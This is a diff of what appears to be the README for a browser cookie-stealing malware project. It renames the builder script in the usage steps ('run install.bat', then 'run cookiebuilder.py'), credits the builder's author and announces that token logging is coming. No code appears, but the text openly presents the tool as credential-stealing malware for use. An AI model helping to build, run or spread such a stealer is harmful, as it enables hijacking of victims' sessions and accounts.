@@ -3,7 +3,7 @@ good Cookie stealer
 
 run install.bat
 
-run builder.py 
+run cookiebuilder.py 
 credits to joselol for making builder
 
 # token log will come soon
